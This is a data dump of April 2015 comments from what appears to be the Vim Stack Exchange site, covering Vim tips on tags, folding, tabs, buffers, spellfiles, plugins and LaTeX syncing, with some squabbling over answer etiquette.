  <row Id="3101" PostId="2935" Score="0" Text="Thanks.  I suspected the answer was somewhere along those lines, although i couldn't quite work out the sequence of commands to get it right.  I'm not too worried about the previous window, but the noautocmd warning was definitely helpful." CreationDate="2015-04-15T16:17:55.573" UserId="1688" />
  <row Id="3102" PostId="2945" Score="0" Text="Wow, and I already have that installed! Never knew it did that!" CreationDate="2015-04-15T16:29:27.367" UserId="1406" />
  <row Id="3103" PostId="2945" Score="3" Text="Might want to look at [Effortless Ctags with Git](http://tbaggery.com/2011/08/08/effortless-ctags-with-git.html). I have also heard good things about the [Gutentags](https://github.com/ludovicchabant/vim-gutentags) plugin." CreationDate="2015-04-15T16:49:51.377" UserId="778" />
  <row Id="3104" PostId="2946" Score="2" Text="Wow. Great hunting!" CreationDate="2015-04-15T17:41:25.890" UserId="673" />
  <row Id="3105" PostId="2931" Score="0" Text="BTW, how do you switch among tabs when using `-p` option? I tried `ctrl`+`PageDown`, `ctrl`+`tab` and `ctrl`+`w`. No one works." CreationDate="2015-04-15T22:20:53.137" UserId="1080" />
  <row Id="3106" PostId="2931" Score="1" Text="@user3813057 you can use the tab navigation commands. For example `:help gt` and `:help gT`" CreationDate="2015-04-15T22:45:02.730" UserId="246" />
  <row Id="3107" PostId="2953" Score="0" Text="That does work, thank you! I just can't figure out why... everything gets a fold level of 1 in my example, so there should just be one fold containing all the lines, right? Why does it do what I want?" CreationDate="2015-04-16T12:41:39.407" UserId="1296" />
  <row Id="3108" PostId="2953" Score="1" Text="The trick is the `&gt;1`, which instructs Vim to start a _new_ fold (even if the level is the same as on the line before)." CreationDate="2015-04-16T13:15:53.367" UserId="970" />
  <row Id="3109" PostId="2955" Score="0" Text="Related question: http://vi.stackexchange.com/questions/1874/how-can-i-get-my-windows-back-into-a-grid-formation." CreationDate="2015-04-16T13:32:46.120" UserId="13" />
  <row Id="3110" PostId="2953" Score="0" Text="Oh ok, I did not see that this is possible in foldexpr. Thanks!" CreationDate="2015-04-16T13:34:46.303" UserId="1296" />
  <row Id="3113" PostId="2959" Score="2" Text="Disabling signs in syntastic: `let g:syntastic_enable_signs = 0`." CreationDate="2015-04-16T14:59:58.227" UserId="1577" />
  <row Id="3115" PostId="2961" Score="0" Text="It might be possible to go from vim to pdf, but the other way around requires functionality in the pdf view to send back some sort of message to vim reporting where in the tex file to jump." CreationDate="2015-04-16T15:48:45.367" UserId="895" />
  <row Id="3117" PostId="2958" Score="0" Text="&quot;For longer files, I understand these flags would probably replace overwrite the numbers in the lines they appear. I wouldn't have a problem with that.&quot;&#xA;&#xA;You could consider not showing the number column or at least making it thinner (`set numberwidth=2`). I know it doesn't solve your problem, but I figure it doesn't hurt to mention." CreationDate="2015-04-16T16:14:36.760" UserId="680" />
  <row Id="3118" PostId="2958" Score="0" Text="Make your window 2 columns wider and permanently enable signs? :)" CreationDate="2015-04-16T18:00:00.913" UserId="609" />
  <row Id="3119" PostId="2963" Score="1" Text="Even though the location is not static, for a given checkout they are fixed to a specific location?  I'm wondering if you couldn't setup a sort of &quot;Per Project vimrc&quot; but instead set one up per checkout." CreationDate="2015-04-16T19:11:52.340" UserId="895" />
  <row Id="3120" PostId="2963" Score="2" Text="See http://vi.stackexchange.com/questions/2944/can-i-load-different-tags-per-project - fugitive.vim + .git/tags = different tags per project" CreationDate="2015-04-16T22:35:54.067" UserId="609" />
  <row Id="3121" PostId="292" Score="0" Text="I found that Obsession didn't remember vertical splits, whereas mksession did. I've only been messing about with this tonight though, is there something that I've missed?" CreationDate="2015-04-17T00:07:15.240" UserId="1443" />
  <row Id="3122" PostId="2947" Score="2" Text="This does not provide an answer to the question. To critique or request clarification from an author, leave a comment below their post - you can always comment on your own posts, and once you have sufficient [reputation](http://vi.stackexchange.com/help/whats-reputation) you will be able to [comment on any post](http://vi.stackexchange.com/help/privileges/comment)." CreationDate="2015-04-17T03:21:17.097" UserId="15" />
  <row Id="3123" PostId="2914" Score="0" Text="Sorry, me again, is there a way to force it to ignore the minus sign? Most of the time I need to change something like '.col-5' to '.col-6' and it's not helping." CreationDate="2015-04-17T10:10:46.210" UserId="237" />
  <row Id="3124" PostId="2403" Score="0" Text="Has anyone figured a way to get completion working for both python 2 and 3? We still use both unfortunately." CreationDate="2015-04-17T12:10:14.903" UserId="1764" />
  <row Id="3125" PostId="2914" Score="1" Text="It would be possible but would be a much larger set of functions. The current implementation takes advantage of `&lt;c-a&gt;` and `&lt;c-x&gt;` which would need to be dropped for a function that does the same but ignores the dash." CreationDate="2015-04-17T13:31:59.533" UserId="895" />
  <row Id="3126" PostId="2961" Score="0" Text="Such a thing exists (you can pass --synctex=1 to pdflatex, and it is understood by some PDF viewers). I don't know to feed that information back to vim however." CreationDate="2015-04-17T14:08:18.323" UserId="92" />
  <row Id="3127" PostId="2962" Score="0" Text="This isn't quite what I want... with texshop, it runs latex on your whole document, opens the PDF viewer, and then moves to the line in the PDF which lines up with the currently open line in vim." CreationDate="2015-04-17T14:14:26.213" UserId="92" />
  <row Id="3128" PostId="2961" Score="0" Text="It looks like there was a synctex + vim discussion over at the Tex site (note its for Linux but Mac shouldn't be much different) http://tex.stackexchange.com/questions/2941/how-to-setup-synctex-with-vim-pdflatex-and-an-open-source-pdf-viewer-under-linu" CreationDate="2015-04-17T14:14:31.257" UserId="895" />
  <row Id="3129" PostId="2962" Score="0" Text="That's much simpler to achieve but the moving of the PDF view might be a bit tricky. vim has a built in set of compiler functions. Check out `:h compiler-tex`. After setting up a few options you can basically call `:make %` and it will compile your latex document." CreationDate="2015-04-17T14:19:49.107" UserId="895" />
  <row Id="3131" PostId="2977" Score="0" Text="That just causes unnecessary buffer reloads; better open the files with the right encoding from the start." CreationDate="2015-04-17T14:32:24.623" UserId="970" />
  <row Id="3133" PostId="2905" Score="1" Text="In single line form: `command! -bang -nargs=+ Bufgrep execute 'vimgrep&lt;bang&gt;&lt;args&gt; ' . join(map(filter(range(1, bufnr('$')), 'buflisted(v:val)'), '&quot;#&quot;.v:val'), ' ')`. Usage: `:Bufgrep/foo/`" CreationDate="2015-04-17T16:33:03.187" UserId="778" />
  <row Id="3134" PostId="2947" Score="0" Text="I tried to comment on the original post but I couldn't. The only alternative I had was the the one I chose @jamessan" CreationDate="2015-04-17T18:05:32.817" UserId="1735" />
  <row Id="3135" PostId="2980" Score="0" Text="Another strange behaviour: When the URI ends in a `/`, it's first downloaded (with `curl`) and then opened. Removing the trailing `/`, the URI is directly opened in the browser." CreationDate="2015-04-17T18:10:42.037" UserId="1631" />
  <row Id="3136" PostId="2982" Score="0" Text="Doesn't work - this is the same example as linked in the OP as well. I don't think it takes into account the line changes / creations that are done in the example. Have you tested this?" CreationDate="2015-04-17T18:29:56.190" UserId="1443" />
  <row Id="3137" PostId="2982" Score="1" Text="Was having issues loading the link for a moment so I posted the quick answer. You are correct, the line changes affect the `{range}` portion of the `normal` command." CreationDate="2015-04-17T19:04:34.793" UserId="895" />
  <row Id="3138" PostId="2982" Score="0" Text="Using the {count}@&lt;register&gt; technique works perfectly fine for me. If you don't feel like counting, yank the selection into an empty temporary buffer (or use NrrwRgn) and do 999@&lt;register&gt;." CreationDate="2015-04-17T19:06:24.887" UserId="680" />
  <row Id="3139" PostId="2982" Score="0" Text="@jecxjo I'm aware of running it with `{count}@register`, the question was how to apply this to a selection without having to know the exact amount of times it had to be run. Cheers" CreationDate="2015-04-17T19:08:37.860" UserId="1443" />
  <row Id="3140" PostId="2982" Score="0" Text="@MattBoehm cheers, yes the point of the OP is that counting isn't always practical (it wasn't for me earlier) whereas being able to run something with a visual block (or visually selecting the entire file) would be simpler as it would save the recursion looping the macro back around. Would be good if you could make a post explaining what you mentioned. Thanks" CreationDate="2015-04-17T19:10:30.173" UserId="1443" />
  <row Id="3141" PostId="2982" Score="0" Text="@baxx will do. Was only hesitant because I have to clean up my macro to remove custom mappings" CreationDate="2015-04-17T19:11:35.523" UserId="680" />
  <row Id="3142" PostId="2982" Score="1" Text="Without writing a function that identifies the line movement, you can't. Even though the `normal` command is thought of being triggered in parallel it really isn't. The range is changed into line numbers and the macro is run on each line. Since the lines move you can't run it in parallel mode." CreationDate="2015-04-17T19:14:02.343" UserId="895" />
  <row Id="3143" PostId="2985" Score="0" Text="Thanks! Alternatively `dwx` instead of `df)`" CreationDate="2015-04-17T20:51:11.937" UserId="40" />
  <row Id="3144" PostId="2980" Score="2" Text="&quot;path name&quot; is defined by the `'isfname'` option, which doesn't include `?` as a valid file name character by default.  Changing this option requires care because it can't be set local to the buffer.  Unless NetRW is changing this option, then that explains why the OPs URLs don't work with `gx`.  Maybe there's a difference in NetRW versions being used, which would explain the different behavior Carpetsmoker sees." CreationDate="2015-04-17T21:28:00.007" UserId="15" />
  <row Id="3145" PostId="2963" Score="0" Text="@jecxjo This would work, but would be difficult for me to set up since I work on a large multi-developer project controlled by mostly emacs users, who would not allow me to commit the .vimrc to the top-level directory." CreationDate="2015-04-17T21:29:34.617" UserId="1747" />
  <row Id="3146" PostId="2968" Score="0" Text="This looks good, but I get &quot;E734: Wrong variable type for +=&quot; when I include it." CreationDate="2015-04-17T21:40:09.733" UserId="1747" />
  <row Id="3147" PostId="2985" Score="0" Text="Huh.. I didn't know I could do ``!" CreationDate="2015-04-17T22:06:41.167" UserId="475" />
  <row Id="3148" PostId="2985" Score="0" Text="It is the &quot;last source of a jump&quot; location." CreationDate="2015-04-17T22:41:56.050" UserId="895" />
  <row Id="3149" PostId="2990" Score="1" Text="You can continue to add to your search and press tab again." CreationDate="2015-04-18T02:11:58.520" UserId="895" />
  <row Id="3150" PostId="2987" Score="0" Text="After restarting vim with everything commented out in `.vimrc` except nerdtree... everything is back to normal. I don't have any explanation for this at the moment, but it fixed itself." CreationDate="2015-04-18T05:49:47.333" UserId="237" />
  <row Id="3151" PostId="2987" Score="0" Text="Sorry it is not consistent actually. I need to investigate it further." CreationDate="2015-04-18T06:31:13.597" UserId="237" />
  <row Id="3152" PostId="2979" Score="6" Text="Anybody, if you want this to be merged, please cheer for it at vim-dev (and also reply back how well this works for you)" CreationDate="2015-04-18T12:06:34.080" UserId="71" />
  <row Id="3154" PostId="462" Score="1" Text="To force, try: `:bufdo! e`." CreationDate="2015-04-18T21:22:10.250" UserId="467" />
  <row Id="3155" PostId="2608" Score="0" Text="To use glob patterns (`**`), you need to have `globstar` set, see: [Match all files under all nested directories with shell globbing](http://stackoverflow.com/q/4349082/55075)." CreationDate="2015-04-18T22:53:44.223" UserId="467" />
  <row Id="3156" PostId="2999" Score="1" Text="Thanks, I didn't think of single-quote, it was too close:) Regarding glob pattern (`**`) it works for bash and zsh, only when `globstar` is set, so sometimes it's not set by default. And it include also the folders. But it's a great substitute:) This one `{,**/}*.*` will exclude folders (bash4)." CreationDate="2015-04-18T23:25:37.813" UserId="467" />
  <row Id="3157" PostId="2999" Score="0" Text="Yep, you're right, `args **` does include folders. You can always give it extensions (`:args *.h *.cpp` etc) to search for, so that it's both faster and will only find files. Amended my answer though." CreationDate="2015-04-18T23:48:31.617" UserId="246" />
  <row Id="3158" PostId="2999" Score="0" Text="Re: globstar, I've performed some small testing in [here](http://stackoverflow.com/a/29731174/55075)." CreationDate="2015-04-19T14:36:26.163" UserId="467" />
  <row Id="3160" PostId="3003" Score="0" Text="Have you tried to escape the character with '/'?" CreationDate="2015-04-19T17:07:30.210" UserId="21" />
  <row Id="3161" PostId="3004" Score="0" Text="I'm accepting this as the answer, but in case anyone else stumbles into this the way I did, here's a link to [the basic solution](http://vi.stackexchange.com/questions/118/how-can-i-use-vims-spellcheck-with-smart-quotes) I ended up using to resolve my issue." CreationDate="2015-04-19T22:55:34.310" UserId="1008" />
  <row Id="3162" PostId="172" Score="0" Text="If you choose to go the `:mkspell!` route, you may also want to filter out words that are intended for irrelevant regions." CreationDate="2015-04-19T22:57:09.023" UserId="1008" />
  <row Id="3163" PostId="3002" Score="0" Text="You didn't read my question carefully. And, the accepted answer already mentions `:args`." CreationDate="2015-04-20T01:59:30.043" UserId="578" />
  <row Id="3164" PostId="3003" Score="0" Text="Please, avoid the XY problem and wasting everyone's time by asking about your goal, not about your failed attempts to reach that goal." CreationDate="2015-04-20T05:16:02.540" UserId="54" />
  <row Id="3165" PostId="3013" Score="1" Text="`:help string-functions`, seriously." CreationDate="2015-04-20T07:03:37.477" UserId="54" />
  <row Id="3166" PostId="3013" Score="1" Text="@romainl thanks for the tip but next time take into account that maybe I've been programming in vimscript for a couple of days and for what I know,  `string-functions` is not a global standard man page for every language, seriously." CreationDate="2015-04-20T07:25:21.390" UserId="1690" />
  <row Id="3167" PostId="3013" Score="0" Text="http://vi.stackexchange.com/a/2137/54" CreationDate="2015-04-20T07:35:11.847" UserId="54" />
  <row Id="3168" PostId="3013" Score="2" Text="I agree with @Jcao02, prior knowledge of the entirety of Vim help pages are not a requirement of this site. And I would classify `:help string-functions` as slightly obscure. Also, some scripting languages like python and perl use `chr()` and `ord()` functions to convert to ascii/character. So searching with these terms still wouldn't show up the `nr2char` and `char2nr` functions either. I think @romainl's comment should be posted as an answer instead." CreationDate="2015-04-20T07:38:07.177" UserId="246" />
  <row Id="3169" PostId="3013" Score="2" Text="I have to agree with romainl: it's very important to know how to navigate vim help pages. My first shell classes taught me `man man`. `:help :help` is equally important. But vim documentation is quite massive and hard to figure the first years. Thus tricks like `:h function^D` give us entries points. Here it would be `:h functions` (/`:h string-functions`). Then, it's easy to understand what's doing what. Even if we are used to other languages. We can always give the information (it's what we're doing most of the time), but teaching how to _fish_ it is more important -- you know the proverb..." CreationDate="2015-04-20T10:24:33.637" UserId="626" />
  <row Id="3170" PostId="3002" Score="0" Text="@JustinM.Keyes Thanks for your points. Wildcard should work by default and this is the only answer which says that it should work in 7.4 (as I had exactly the same error before the upgrade). Using `args` is only the workaround, but further more it shows you how to use the shell expansion within vim it-self in case further users wants to use it for more complex solutions, by using `find`, such as [this one](http://vi.stackexchange.com/q/2997/467). So I think it gives some additional value to your question. So I hope it's fine with you." CreationDate="2015-04-20T10:42:01.657" UserId="467" />
  <row Id="3171" PostId="3017" Score="3" Text="And to obtain the complete list, you have this oneliner `echo join(map(filter(copy(range(1, bufnr('$'))), 'buflisted(v:val)'), '&quot;  &quot;.fnamemodify(bufname(v:val), &quot;:p&quot;)'), &quot;\n&quot;)`. However, if you want to display the other information (displayed by `:buffer`), prefer a loop to build the _indicators_ string." CreationDate="2015-04-20T13:08:12.493" UserId="626" />
  <row Id="3172" PostId="3003" Score="0" Text="What is the XY problem?  Apologies if I deeply offended you in any way.  I thought the `iskeyword` argument was the most direct solution for this.  In fact, I'm still not sure what its purpose could be other than to affect things like what counts as a word for spelling." CreationDate="2015-04-20T16:44:13.553" UserId="1008" />
  <row Id="3173" PostId="3018" Score="0" Text="Not directly an answer to your question, but you might still want to look at [par](http://www.nicemice.net/par/).  Absolutely outstanding in my experience, provided that you take your time to digest the manual." CreationDate="2015-04-20T18:39:44.640" UserId="1577" />
  <row Id="3174" PostId="3008" Score="0" Text="Sounds to me like its a bug." CreationDate="2015-04-20T19:22:30.137" UserId="895" />
  <row Id="3175" PostId="3002" Score="0" Text="I never had an issue with `vim */foo`, and there's no way that could be related to the Vim version, because that's a *shell* feature." CreationDate="2015-04-20T21:32:25.607" UserId="578" />
  <row Id="3176" PostId="3015" Score="2" Text="Thanks for the tip, but again, there are unnecessary comments in that answer. If you're going to answer a question, be serious about it and stop using sarcasm and irony. If you can't avoid it, just ignore the question and don't answer at all" CreationDate="2015-04-21T00:10:18.990" UserId="1690" />
  <row Id="3177" PostId="3015" Score="3" Text="@romainl, this is exactly the answer you should have posted, rather than a comment. I didn't say don't tell users how to search the help pages, in fact, I was saying tell them ***how*** to. Posting this as an answer and showing users how to search the help pages is better than posting a comment saying &quot;help string-functions, seriously&quot;. How do new users learn from that type of comment? You have to teach them something." CreationDate="2015-04-21T02:30:49.463" UserId="246" />
  <row Id="3178" PostId="3013" Score="1" Text="@LucHermitte I would argue that just posting `:help string-functions` is not showing how to fish. It's more like giving someone the bait and not teaching them to fish at all. Posting *how* they can search for functions, is teaching them to fish." CreationDate="2015-04-21T02:33:17.293" UserId="246" />
  <row Id="3179" PostId="3008" Score="3" Text="`vi -es +'bufdo! %s/\s\+$//e' -cxa ...` works here" CreationDate="2015-04-21T04:59:40.780" UserId="188" />
  <row Id="3180" PostId="3015" Score="0" Text="@akshay, I already posted [an extensive QA](http://vi.stackexchange.com/a/2137/54) on the subject. The OP didn't even try to look for an answer on his own before turning to others. He doesn't want to learn, he seems to only want to be spoon-fed, like so many stack exchange users. Sarcasm is the only thing people like that deserve." CreationDate="2015-04-21T07:27:18.900" UserId="54" />
  <row Id="3181" PostId="3021" Score="0" Text="I am unable to reproduce this problem using the Vim 7.3 that comes with OS X 10.9." CreationDate="2015-04-21T08:00:41.720" UserId="24" />
  <row Id="3182" PostId="3021" Score="1" Text="How about `:au CursorHoldI` or `:au CursorMovedI` ( both ending with uppercase i )?" CreationDate="2015-04-21T09:21:39.503" UserId="1782" />
  <row Id="3183" PostId="3021" Score="0" Text="Please show exact Vim version" CreationDate="2015-04-21T19:13:02.953" UserId="71" />
  <row Id="3184" PostId="3021" Score="0" Text="I can't reproduce on vim 7.4.448" CreationDate="2015-04-21T20:20:00.620" UserId="306" />
  <row Id="3185" PostId="3021" Score="1" Text="I can not reproduce with Vim 7.4 patches 1-622 using `vim -u NONE`. I would recommend you disable your plugins and vimrc customization until you find the culprit. protip: use a binary search to make it quicker." CreationDate="2015-04-21T21:01:47.597" UserId="778" />
  <row Id="3186" PostId="3025" Score="0" Text="&quot;files&quot;, &quot;lines&quot;, something else? Please fix your question." CreationDate="2015-04-22T07:33:15.573" UserId="54" />
  <row Id="3187" PostId="3023" Score="0" Text="You should send Bram a bug report via the vim_use or vim_dev mailing list." CreationDate="2015-04-22T07:47:50.297" UserId="54" />
  <row Id="3188" PostId="3025" Score="1" Text="Sorry, first line of file. Fixed question." CreationDate="2015-04-22T08:30:00.447" UserId="1820" />
  <row Id="3189" PostId="3026" Score="0" Text="I've edited my question to clarify that I'd like to search in 1st line of files matching a pattern, and replace it with something else. Sorry for the confusion." CreationDate="2015-04-22T09:24:42.747" UserId="1820" />
  <row Id="3190" PostId="3026" Score="0" Text="I've augmented my answer, is that what you wanted?" CreationDate="2015-04-22T10:52:28.393" UserId="1296" />
  <row Id="3191" PostId="3023" Score="1" Text="Good to know that. By comparing `matchparen.vim` between Vim 7.3 and 7.4, I am able to narrowing this to `save_cursor` variable used in the file. Rather than disabling autocmd, you can instead replace `let save_cursor = getcurpos()` and `call setpos('.', save_cursor)` with `let save_cursor = winsaveview()` and `call winrestview(save_cursor)` respectively. This way you don't loose the parenthesis pair highlighting." CreationDate="2015-04-22T12:28:22.577" UserId="1782" />
  <row Id="3192" PostId="3028" Score="6" Text="Use the `c` flag for &quot;confirmation&quot;: `%s/variable/m_&amp;/gc`." CreationDate="2015-04-22T14:20:49.850" UserId="54" />
  <row Id="3193" PostId="3023" Score="0" Text="I can't imagine why `getcurpos()` wouldn't work. In any case, a reproducable example of the problem should be posted to the vim-dev mailinglist, so Bram can fix the plugin." CreationDate="2015-04-22T18:05:43.783" UserId="71" />
  <row Id="3194" PostId="3035" Score="0" Text="Didn't quite work. My configuration (and maybe its different than yours) of exchange.vim doesn't move the cursor to the `)` after the first sequence but rather leaves it at the beginning. I had to move two words (the  'x' and '(' ) and then apply. So basically `cx%2w.`" CreationDate="2015-04-22T19:03:09.993" UserId="895" />
  <row Id="3195" PostId="3035" Score="0" Text="Oops. To tell the truth, I didn't try this before posting. A more reliable way would be to type `%` again. I'll update the answer." CreationDate="2015-04-22T19:05:45.103" UserId="64" />
  <row Id="3196" PostId="3035" Score="0" Text="Using the `.` method should use `%` as exchange.vim is setup to use the same cut mechanism when triggered this way." CreationDate="2015-04-22T19:07:36.897" UserId="895" />
  <row Id="3197" PostId="3035" Score="0" Text="Ooh, that's clever! Updating the answer again haha" CreationDate="2015-04-22T19:09:20.980" UserId="64" />
  <row Id="3198" PostId="3035" Score="0" Text="Wait, that leaves the parentheses intact. Not what the OP asked for." CreationDate="2015-04-22T19:14:19.410" UserId="64" />
  <row Id="3199" PostId="3035" Score="0" Text="Think you need to move two words/characters over (cursor over the `y`)." CreationDate="2015-04-22T19:17:38.133" UserId="895" />
  <row Id="3200" PostId="3035" Score="0" Text="That would work for the specific example OP gave, but it's not a general solution to the question asked." CreationDate="2015-04-22T19:19:36.490" UserId="64" />
  <row Id="3201" PostId="3032" Score="0" Text="This looks good, but I can't seem to figure out a command that works for excluding the undo files. I tried `let g:netrw_list_hide= '.*\.un~$'` and it doesn't work." CreationDate="2015-04-22T19:51:51.260" UserId="226" />
  <row Id="3202" PostId="3026" Score="0" Text="I believe @ayutheos wants to find `^++` only when it appears in the first line in the file, not find the first occurrence of a line that matches `^++`." CreationDate="2015-04-22T20:25:41.077" UserId="343" />
  <row Id="3203" PostId="3026" Score="0" Text="I think therefore that `:argdo 1s/^++/--/e` should suffice." CreationDate="2015-04-22T20:38:49.800" UserId="343" />
  <row Id="3204" PostId="3039" Score="0" Text="I was not aware of the zoom anchors.   Thanks for explaining them." CreationDate="2015-04-22T21:21:21.657" UserId="865" />
  <row Id="3205" PostId="3015" Score="0" Text="@romainl and you deserve an award for the teacher of the year. I wrote my own function to handle my problem, is my first time using vimscript and I wanted to go further by asking. I admit I should have looked the help pages like in any other language, but guess what, I didn't know the help pages were that well documented and sorry for not typing the right words on google to get to your post. I appreciate the content of your answer, but not the way you wrote it. -1" CreationDate="2015-04-23T00:22:15.223" UserId="1690" />
  <row Id="3206" PostId="3026" Score="0" Text="@Rich Yes, that's what I wanted, thanks for clarifying :) . I found that both solutions given by kenorb and PhillipFrank worked (vimgrep gives a quicklist, while argdo substitutes all files in arglist). Thank you!" CreationDate="2015-04-23T05:29:14.070" UserId="1820" />
  <row Id="3207" PostId="3025" Score="0" Text="Both answers given by kenorb &amp; PhillipFrank worked, I was able to use argdo to find and substitute all occurrences, and vimgrep to check which files have been changed. I've marked one to close this question, but both solutions work. Thank you!" CreationDate="2015-04-23T05:35:30.517" UserId="1820" />
  <row Id="3208" PostId="3023" Score="0" Text="Probably related to this: https://groups.google.com/forum/#!topic/vim_dev/CMAGD6obzKo" CreationDate="2015-04-23T06:57:02.177" UserId="1782" />
  <row Id="3209" PostId="3023" Score="1" Text="That is a fixed by 7.4.578 (probably that's why I can't reproduce it), So please try with a newer Vim." CreationDate="2015-04-23T09:36:49.793" UserId="71" />
  <row Id="3210" PostId="3046" Score="5" Text="For terminology, just refer to the very comprehensive `:help`. For an introduction / overview of Vim, there are tons of web pages, vimcasts.org, or even a number of books." CreationDate="2015-04-23T13:45:31.820" UserId="970" />
  <row Id="3212" PostId="2608" Score="0" Text="@JustinM.Keyes The buffer list is a superset of the args list, so that's expected." CreationDate="2015-04-23T14:34:22.513" UserId="15" />
  <row Id="3214" PostId="3038" Score="0" Text="No, I actually want NERDTree to open the file in the current tab and only the current tab, without switching to an existing open buffer in a different tab.&#xA;&#xA;What T does is open the file in a new tab." CreationDate="2015-04-23T20:28:16.853" UserId="333" />
  <row Id="3215" PostId="3049" Score="0" Text="I checked my formatoptions. It is set as 'tcroql'. Sorry if my question was not clear enough. I have no issues with auto-formatting. I would just like it to be &quot;paused&quot; when I am using visual mode, and resume after I exit it." CreationDate="2015-04-24T04:02:21.540" UserId="230" />
  <row Id="3216" PostId="3049" Score="0" Text="Interesting, I don't see wrapping under such circumstances. Does my solution work when you do `:setl fo-=c fo-=t` instead of `:setl fo-=a`? You could also `:set paste` ... `:set nopaste` instead." CreationDate="2015-04-24T07:25:02.217" UserId="970" />
  <row Id="3217" PostId="3038" Score="0" Text="Yes! Sorry I didn't get it the first time; however, this is not implemented by default in NERDTree. By default NERDTree will switch you to the file if it already exist. Which is - to most of us -  is the natural required behavior of any editor. According to my experience with NERDTree and its complement NERDTreeTabs (NERDTreeTabs makes NERDTree tab-aware, you have to install them both), you can have the same file open in multiple tab. Right now I can open a file in multiple tabs using T and t, but I have to explicitly tell NERDTree to do that." CreationDate="2015-04-24T08:18:13.087" UserId="1832" />
  <row Id="3218" PostId="3057" Score="0" Text="I do not use ex copy enough, good suggestion." CreationDate="2015-04-24T14:25:13.837" UserId="895" />
  <row Id="3219" PostId="3049" Score="0" Text="I think that what he is doing is pressing `A` in a visual block. I see the same behavior on my side. It should be possible to remap `A` in such conditions to save and reset `tw`, as you did with `fo`." CreationDate="2015-04-24T18:09:09.247" UserId="599" />
  <row Id="3220" PostId="3049" Score="0" Text="@Vitor: Thanks, I think I really misunderstood. Yes, such remap is possible, if somewhat more complex. I've added that." CreationDate="2015-04-24T18:44:43.357" UserId="970" />
  <row Id="3221" PostId="3061" Score="0" Text="Well, you a right about `synIDattr()`. I tried the following example: `:echo synIDattr(synIDtrans(synID(line(&quot;.&quot;), col(&quot;.&quot;), 1)), &quot;bg&quot;)`.&#xA;It returns nothing on regular text." CreationDate="2015-04-24T19:26:22.313" UserId="1860" />
  <row Id="3222" PostId="3062" Score="0" Text="The second command worked, although it still prints output on the screen. Additionally, I don't need to press Enter when the script ends anymore, which is good. But I wonder if there is any way to totally suppress the output." CreationDate="2015-04-24T19:44:59.130" UserId="1837" />
  <row Id="3223" PostId="3062" Score="0" Text="Does replacing `execute &quot;!./make.sh&quot;` with `execute &quot;!./make.sh &gt;/dev/null 2&gt;&amp;1&quot;` help?  This redirects all output of the command to `/dev/null`.  Read http://www.tldp.org/LDP/abs/html/io-redirection.html for more information on redirection in bash." CreationDate="2015-04-24T19:56:23.890" UserId="865" />
  <row Id="3224" PostId="3062" Score="0" Text="I should have thought of that! It works. Thanks!" CreationDate="2015-04-24T19:59:55.913" UserId="1837" />
  <row Id="3226" PostId="209" Score="0" Text="Is there a way to do this *without* setting `mouse=a`? I don't want accidental clicks messing up my editing flow." CreationDate="2015-04-24T23:23:32.960" UserId="142" />
  <row Id="3227" PostId="3064" Score="0" Text="I thought about `:make` while I was answering this, but I didn't include it.  It is a better idea to use make fore compiling things." CreationDate="2015-04-25T00:21:06.830" UserId="865" />
  <row Id="3228" PostId="3059" Score="0" Text="Beware that there's a (small but non-zero) runtime price to each `matchadd()`.  Perhaps a better approach might be to keep a list of IDs and delete the relevant ones rather than make them do nothing." CreationDate="2015-04-25T04:47:05.390" UserId="1577" />
  <row Id="3229" PostId="3067" Score="1" Text="This will operate on the last open buffer, which isn't *exactly* what I wanted, but since it doesn't quit, it's good enough for my purposes." CreationDate="2015-04-25T05:23:22.273" UserId="920" />
  <row Id="3230" PostId="3059" Score="0" Text="@lcd047 I would like to do it this way, but the issue is that pattern, that should be ignored actually have a subpattern that should be highlighted in all other places except matching ignored one (e.g. `\s\+$` and `&gt;\s\+\$` that should be ignored)." CreationDate="2015-04-25T05:44:10.443" UserId="1860" />
  <row Id="3232" PostId="3073" Score="0" Text="Does not do anything in normal mode exept beeping and in insert mode somehow triggers completion. :/" CreationDate="2015-04-25T14:37:06.997" UserId="1869" />
  <row Id="3233" PostId="3072" Score="3" Text="An alternative to `Esc` key that is more 'reachable' is `Ctrl-[`" CreationDate="2015-04-25T15:58:22.127" UserId="1782" />
  <row Id="3234" PostId="3067" Score="0" Text="The vim-bbye plugin might be what you're looking for: https://github.com/moll/vim-bbye" CreationDate="2015-04-25T17:08:31.133" UserId="67" />
  <row Id="3236" PostId="3072" Score="0" Text="Why would &lt;Nul&gt; be a ctrl-space?" CreationDate="2015-04-25T23:38:55.977" UserId="1094" />
  <row Id="3237" PostId="3073" Score="1" Text="Do you have existing mappings for c-space? These should work, I think, unless your vim is not recognizing the keystroke." CreationDate="2015-04-25T23:40:57.193" UserId="1094" />
  <row Id="3238" PostId="3076" Score="2" Text="Have you looked at http://vi.stackexchange.com/questions/84/how-can-i-copy-text-to-the-system-clipboard-from-vim?" CreationDate="2015-04-26T03:32:12.220" UserId="205" />
  <row Id="3239" PostId="3078" Score="2" Text="I use Arch Linux, and `has('clipboard')` in `vim` works fine. You *do* need to install the `gvim` package to get a Vim linked to libX11; but you don't need to use `gvim`." CreationDate="2015-04-26T08:24:32.603" UserId="51" />
  <row Id="3242" PostId="3080" Score="0" Text="Right from the source, thank you!" CreationDate="2015-04-26T11:07:56.483" UserId="1787" />
  <row Id="3243" PostId="3072" Score="0" Text="Control-Space is a potentially difficult thing, since it's a signal which differnt TERMs send differently. It can be &lt;C-Space&gt; or &lt;NUL&gt;, if it's sent at all." CreationDate="2015-04-26T19:50:48.903" UserId="130" />
  <row Id="3244" PostId="3079" Score="0" Text="So simple and elegant solution! Only I'd rather `mkdir ~/Dropbox/vim &amp;&amp; mv ~/.vim/spell ~/Dropbox/vim/` instead of `rmdir` :)" CreationDate="2015-04-26T19:59:04.090" UserId="418" />
  <row Id="3245" PostId="3075" Score="0" Text="That's strange to me that with `:set spellfile=&lt;list of .add files in ~/.vim/spell&gt;` Vim will work differently than if I would leave `'spellfile'` empty. Vim will work with exactly the same set of files but would threat them differently. Was it implemented this way intentionally with some specific use case in mind?" CreationDate="2015-04-26T20:06:45.857" UserId="418" />
  <row Id="3246" PostId="3085" Score="0" Text="Hmmm. It works, but I don't understand how the documentation relates to the behavior — the description of `o` even explicitly states that it applies to `:wn`. What kind of messages might `O` overwrite? I don't care about the message that a file has been successfully written, but don't want to miss important messages, like failing to write a file." CreationDate="2015-04-26T21:52:26.303" UserId="8" />
  <row Id="3247" PostId="3073" Score="0" Text="Should work for most modern terminals, however you can also map `&lt;C-@&gt;`like @tivn suggests, that works as well, the reason being both send the same key codes to vim." CreationDate="2015-04-26T23:05:52.173" UserId="74" />
  <row Id="3249" PostId="3088" Score="0" Text="Would this be faster than @Carpetsmoker's answer?" CreationDate="2015-04-26T23:52:14.590" UserId="865" />
